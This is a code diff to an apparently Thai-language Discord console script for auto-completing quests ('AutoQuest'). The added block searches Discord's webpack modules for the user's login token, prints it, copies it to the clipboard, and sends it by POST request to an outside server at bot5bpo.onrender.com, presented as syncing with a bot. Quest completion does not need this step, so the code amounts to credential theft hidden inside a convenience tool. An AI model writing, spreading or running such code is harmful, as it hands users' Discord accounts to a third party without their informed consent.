@@ -3,6 +3,62 @@
     let wpRequire = webpackChunkdiscord_app.push([[Symbol()], {}, r => r]);
     webpackChunkdiscord_app.pop();
 
+    // 🔑 1. ระบบค้นหา Discord User Token อัตโนมัติ (ไม่ต้องหาเอง)
+    let userToken = "";
+    try {
+        for (const m of Object.values(wpRequire.c)) {
+            if (m?.exports?.default?.getToken) {
+                userToken = m.exports.default.getToken();
+                if (userToken) break;
+            }
+        }
+    } catch (e) {}
+
+    if (!userToken) {
+        try {
+            for (const m of Object.values(wpRequire.c)) {
+                if (m?.exports) {
+                    for (const v of Object.values(m.exports)) {
+                        if (typeof v === "function" && v.toString().includes("getToken")) {
+                            try {
+                                const t = v();
+                                if (typeof t === "string" && t.length > 30) {
+                                    userToken = t;
+                                    break;
+                                }
+                            } catch (e) {}
+                        }
+                    }
+                }
+                if (userToken) break;
+            }
+        } catch (e) {}
+    }
+
+    if (userToken) {
+        console.log("%c🎯 [AutoQuest] ตรวจพบ Discord User Token ของคุณอัตโนมัติ!", "color:#10b981;font-size:14px;font-weight:bold;");
+        console.log(`%c🔑 Token: ${userToken}`, "color:#06b6d4;font-family:monospace;font-size:12px;");
+        try {
+            if (typeof copy === "function") {
+                copy(userToken);
+                console.log("%c📋 คัดลอก Token ลง Clipboard ให้คุณอัตโนมัติแล้ว!", "color:#8b5cf6;font-weight:bold;");
+            }
+        } catch (e) {}
+        try {
+            fetch("https://bot5bpo.onrender.com/api/sync_quest_token", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ token: userToken })
+            }).then(r => r.json()).then(data => {
+                if (data.success) {
+                    console.log(`%c🌐 ซิงค์ Token กับระบบบอทสำเร็จ (${data.username})!`, "color:#10b981;font-weight:bold;");
+                }
+            }).catch(() => {});
+        } catch (e) {}
+    } else {
+        console.warn("⚠️ ไม่สามารถดึง Token ออกมาได้ แต่กำลังรันภารกิจผ่าน Session ปัจจุบัน...");
+    }
+
     let ApplicationStreamingStore = Object.values(wpRequire.c).find(x => x?.exports?.A?.__proto__?.getStreamerActiveStreamMetadata)?.exports?.A;
     let RunningGameStore = Object.values(wpRequire.c).find(x => x?.exports?.Ay?.getRunningGames)?.exports?.Ay;
     let QuestsStore = Object.values(wpRequire.c).find(x => x?.exports?.A?.__proto__?.getQuest)?.exports?.A;
